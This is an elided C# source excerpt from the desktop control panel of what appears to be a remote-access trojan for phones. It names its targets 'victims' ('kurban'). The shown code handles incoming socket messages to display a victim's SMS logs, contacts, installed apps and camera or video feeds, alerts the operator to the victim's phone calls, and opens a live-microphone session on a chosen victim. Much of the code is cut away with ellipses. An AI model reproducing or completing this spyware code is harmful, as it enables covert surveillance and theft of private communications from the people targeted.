...
namespace SV
{
    ...
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        ...
        public Adress FindRehberById(string ident)
        {
            try
            {
                var list = Application.OpenForms
        ...
        public SMSManager FindSMSFormById(string ident)
        {
            try
            {
                var list = Application.OpenForms
        ...
        public Camera FİndCameraById(string ident)
        {
            try
            {
                var list = Application.OpenForms
        ...
        public InstallApps FindUygulamalarById(string ident)
        {
            try
            {
                var list = Application.OpenForms
            ...
            try
            {
                switch (tag.Split('|')[0])
                {
                    ...
                    case "<MYVIDREADY>":
                        ...
                        if (krbn_ != null)
                        {
                            var shortcam_ = FİndCameraById(krbn_.id);
                            try
                            {
                                if (shortcam_ != null)
                                {
                            ...
                            catch (Exception ex)
                            {
                                if (shortcam_ != null)
                                {
                                    FİndCameraById(krbn_.id).Text = ex.ToString();
                                }
                            }
                        }
                        else
                    ...
                    case "<CAMREADY>":
                        if (FİndCameraById(soket2.Handle.ToString()) != null)
                        {
                            var _shortcam_ = FİndCameraById(soket2.Handle.ToString());
                    ...
                    case "<VID>":
                        ...
                        if (krbn != null)
                        {
                            var shortcam = FİndCameraById(krbn.id);
                            try
                            {
                                if (shortcam != null)
                                {
                            ...
                            catch (Exception ex)
                            {
                                if (shortcam != null)
                                {
                                    FİndCameraById(krbn.id).Text = ex.ToString();
                                }
                            }
                        }
                        else
                    ...
                    case "<SMSLOGU>":
                        if (FindSMSFormById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                SMSManager sMS = new SMSManager(soket2, soket2.Handle.ToString());
                    ...
                    case "<REHBER>":
                        if (FindRehberById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                Adress sMS = new Adress(soket2, soket2.Handle.ToString());
                    ...
                    case "<APPS>":
                        if (FindUygulamalarById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                InstallApps eglence = new InstallApps(soket2, soket2.Handle.ToString());
                        ...
                        if (Settings.dosyaYollari("notify_call") == "1")
                        {
                            try
                            {
                                ...
                                Invoke((MethodInvoker)delegate
                                {
                                    ...
                                    var yeni = new NewCall(dt.Split('=')[1], dt.Split('=')[0], krbnIsminiBul(soket2.Handle.ToString()), soket2.Handle.ToString());
        ...
        private void liveMicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        Microfon masaustu = new Microfon(kurban.soket);
